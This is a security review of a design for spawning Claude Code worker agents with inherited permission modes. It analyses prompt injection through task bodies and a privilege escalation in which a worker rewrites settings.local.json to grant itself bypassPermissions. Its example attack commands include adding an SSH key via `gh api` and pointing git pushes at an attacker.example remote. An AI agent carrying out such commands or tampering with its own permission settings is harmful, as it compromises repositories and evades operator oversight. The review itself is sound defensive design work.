# Security review: worker-permissions

## Dimension analysis

### External artifact handling

**Applies:** No

The design does not introduce any new external artifact handling. The two new
functions — `WorkerPermissionMode` and `WorkerExtraAllowedTools` — are pure
readers of a local file (`settings.local.json`) and pure producers of a static
string slice. No network I/O, no downloaded binaries, no parsed user-supplied
archives. The existing `spawnWorker` path already executes the `claude` binary
via `exec.Command`; this design does not change the binary source or add any
new execution paths. No applicable risk.

### Permission scope

**Applies:** Yes — **Severity: High (bypass branch); Medium (acceptEdits
branch)**

**Bypass branch:**  When `settings.local.json` carries
`permissions.defaultMode = "bypassPermissions"`, workers are spawned with
`--permission-mode=bypassPermissions`. That is full, unmediated shell access
under the OS user running the daemon. A worker in bypass mode can read any
file the daemon user can read, write any file, execute any binary, and make
arbitrary network connections. The design calls this out as identical to the
coordinator's blast radius, which is accurate — but the consequence is that
every worker across every task inherits that ceiling. If a coordinator
legitimately needs bypass for one broad task (say, `make release`) and the
workspace is long-lived, unrelated delegated subtasks spawned later in the
same workspace session also get bypass, even if those subtasks don't need it.

**Mitigation:** Consider scoping bypass at the task level rather than the
instance level. The `TaskEnvelope` already has a `body` field. The design
notes that `niwa_delegate` owns the task envelope and can carry additional
fields — a `permissionMode` or `allowedTools` override in the envelope would
let coordinators grant bypass narrowly per delegation rather than globally.
This would also block the "orphan bypass" scenario: a coordinator demotes from
bypass to ask mid-session by updating `settings.local.json`, but existing
queued workers still get the old bypass level because `WorkerPermissionMode`
reads fresh at each spawn.

**acceptEdits + curated Bash branch:** This branch is less severe but not
harmless. The curated patterns (`Bash(gh *)`, `Bash(git *)`, `Bash(go test *)`,
`Bash(go build *)`, `Bash(make *)`) are explicitly not a security boundary per
the design. They pre-approve arbitrary `gh` subcommands (including `gh api`,
`gh secret`, `gh auth`) and arbitrary `git` subcommands (including
`git push --force`, `git remote set-url`, `git config`). A worker that can
call `gh api` without approval can read and write any GitHub resource accessible
to the authenticated user's token. The design should note concretely that the
curated list is a usability default only, not a restriction.

**Mitigation:** Document clearly that the curated Bash list grants substantial
capability. Consider whether `Bash(gh *)` should be narrowed to
`Bash(gh pr *)` or `Bash(gh issue *)` in the common case, with bypass reserved
for broader access. Alternatively, expose the curated list as a configurable
workspace setting so operators can tighten it per deployment.

### Supply chain or dependency trust

**Applies:** No

The design adds no new dependencies or artifact downloads. The `spawnBin`
(`claude`) is already resolved once at daemon startup via `resolveSpawnTarget`;
workers are spawned from the same resolved path. The two new workspace
functions consume only the local filesystem. No new build-time or runtime
supply chain surface is introduced.

### Data exposure

**Applies:** Yes — **Severity: Low**

`WorkerPermissionMode` reads `settings.local.json`, which is written by the
`SettingsMaterializer` with `0o600` permissions. That file may contain resolved
secrets promoted into the Claude Code env block (the `env` key in settings),
depending on the workspace configuration. The design reads only
`.permissions.defaultMode` from this file, but a naive `json.Unmarshal` into
`map[string]any` will parse the entire file in-process, including any
`env.*` fields carrying secret material. The material does not leave the
process, but it does widen the in-process attack surface: any code path that
can observe the parsed map (e.g., a debug logger dumping the struct) could
inadvertently log secrets.

**Mitigation:** Parse only the fields actually needed — read
`.permissions.defaultMode` using a minimal struct rather than full file
deserialization. This is also a performance improvement (no need to parse the
env block). A struct like the following is sufficient:

```go
type settingsPermissions struct {
    Permissions struct {
        DefaultMode string `json:"defaultMode"`
    } `json:"permissions"`
}
```

Workers receive their env via the coordinator's already-established `.local.env`
and `settings.local.json` inheritance. The design does not add any new env
propagation path, so no new secret transmission surface is introduced.

### Prompt injection

**Applies:** Yes — **Severity: High**

This is the most significant residual risk and the design explicitly
acknowledges it as a known limitation. Workers receive a fixed bootstrap prompt
(`"You are a worker for niwa task %s. Call niwa_check_messages..."`) and then
retrieve their task body via `niwa_check_messages`. The task body is
coordinator-generated and is not sanitized before being presented to the worker
as an instruction set.

The risk: a malicious actor who can influence the coordinator's task body
(through a compromised repository, injected tool output fed back into the
coordinator's context, or a compromised upstream data source) can direct the
worker to take arbitrary actions. In the acceptEdits + curated Bash branch,
the injected body can instruct the worker to run `gh api /user/keys -X POST`
(to add an SSH key), `git remote set-url origin https://attacker.example/repo`
(to redirect pushes), or `make` with a crafted Makefile. In the bypass branch,
the full shell is available with no additional friction.

This is not specific to this design — it exists today with the fixed
`acceptEdits` mode — but the design widens the blast radius when coordinators
have `bypassPermissions`. A coordinator that exists solely to coordinate
headless subtasks may not need bypass itself, but may receive bypass because a
human operator enabled it for a different purpose.

**Mitigation:** The design's existing mitigations (fixed bootstrap prompt,
bootstrap prompt never containing task body in argv, daemon SIGKILL before
teardown) are correct and should be preserved. Additional mitigations to
consider:

1. Network egress controls. In the bypass branch, workers can make arbitrary
   network calls. A `Bash(curl *)` invocation is not in the curated list,
   but `gh api` over HTTPS is. Network namespacing (Linux network namespaces
   or a local proxy) would contain exfiltration, but this is likely out of
   scope for a v1 design.
2. Audit logging. The existing `transitions.log` records state transitions but
   not tool calls made by workers. Wiring a Claude Code `post_tool_use` hook
   into workers would create an audit trail of every shell command executed.
   This doesn't prevent injection but provides forensic visibility.
3. Task body validation. For structured task bodies (e.g.,
   `{"action": "create_pr", "branch": "..."}`) the daemon could validate
   envelope.body against a schema before spawning, refusing anomalous payloads.
   This is a defense-in-depth layer, not a complete fix.

### settings.local.json tamper

**Applies:** Yes — **Severity: High**

`WorkerPermissionMode` reads `settings.local.json` fresh at each spawn. This
file is located at `<instanceRoot>/.claude/settings.local.json` and is written
by `niwa apply` with `0o600` permissions. Any process running as the same OS
user — including a compromised worker running in acceptEdits mode — can
overwrite this file between calls to `niwa apply`.

**Attack scenario:** A worker in acceptEdits mode (the lower-privilege branch)
rewrites `settings.local.json` to inject `"permissions": {"defaultMode":
"bypassPermissions"}`. The next task spawned by the daemon reads this tampered
file and receives full bypass permissions, even though the operator never
configured bypass.

This is a privilege escalation from acceptEdits to bypassPermissions via a
single file write. The worker has acceptEdits already, which allows writing
files — and `settings.local.json` is just a file.

**Severity assessment:** The current codebase uses a hardcoded
`--permission-mode=acceptEdits` (line 891 of `mesh_watch.go`), so workers
cannot currently escalate by writing `settings.local.json` because the daemon
ignores it. The proposed design introduces this attack surface for the first
time.

**Mitigation options:**

1. **Hash-check**: Record a SHA-256 of `settings.local.json` at `niwa apply`
   time and store it in a daemon-owned file (e.g., `.niwa/settings.checksum`)
   written `0o400` and only readable by the daemon. At each spawn, recompute
   the hash and refuse to honor bypass if the file has changed. Workers cannot
   write `.niwa/` because its contents are monitored and the daemon would
   notice. However, this only works if `.niwa/` itself has restrictive
   permissions — currently it is `0o700`, which is sufficient (same user, so
   the worker can still write there).

2. **Epoch pinning**: `niwa apply` writes a monotonic epoch counter into
   `.niwa/apply.epoch`. `WorkerPermissionMode` accepts bypass only when the
   epoch matches the one present at daemon start. A tampered
   `settings.local.json` without a matching epoch bump is rejected.

3. **Coordinator-owned bypass flag**: The coordinator session registers itself
   with the daemon (via a `--permission-mode` flag passed when starting the
   coordinator, or a field in `.niwa/sessions/sessions.json`). The daemon reads
   bypass authorization from this coordinator-owned registration, not from a
   file workers can write. Workers can never escalate because they cannot modify
   the coordinator registration.

Option 3 is architecturally cleanest and eliminates the TOCTOU surface
entirely. Option 1 is the simplest incremental mitigation if a broader change
is out of scope for this phase.

---

## Recommended outcome

**OPTION 3 — coordinator-owned bypass flag (with incremental Option 1 as a
minimum baseline)**

The tamper scenario (a worker with acceptEdits writing `settings.local.json`
to escalate to bypass) is a concrete, novel attack surface introduced by this
design that does not exist today. It must be closed before the design ships.
The prompt injection risk is pre-existing and the design's existing mitigations
are appropriate, but the tamper surface is new and specific to this change.

If Option 3's scope is too large for Phase 5, ship with the hash-check from
Option 1 as a minimum: store a `settings.checksum` file written by `niwa apply`
at `0o400`, and refuse bypass if the checksum does not match at spawn time.
Pair this with a SIGKILL-before-teardown policy (already present) so a tampered
worker cannot persist state.

Additionally: parse `settings.local.json` with a minimal struct to avoid
loading secret material unnecessarily, and document explicitly that the curated
Bash tool list is a usability default, not a security boundary.

## Summary

The design introduces a concrete privilege escalation path — workers running
under `acceptEdits` can write `settings.local.json` to inject
`bypassPermissions`, causing the daemon to grant full shell access to the next
spawned worker. This attack surface does not exist in the current hardcoded
design and must be addressed before shipping. The existing prompt injection
risk is pre-existing and correctly acknowledged; the mitigations in place
(fixed bootstrap prompt, SIGKILL on teardown) are appropriate baselines, but
the curated Bash tool list grants substantial capability (arbitrary `gh api`,
`git push`, `make`) and should be documented as a usability feature rather than
a security control. With the tamper surface closed — minimally via a
`settings.local.json` hash check written by `niwa apply` — the design is
otherwise sound.
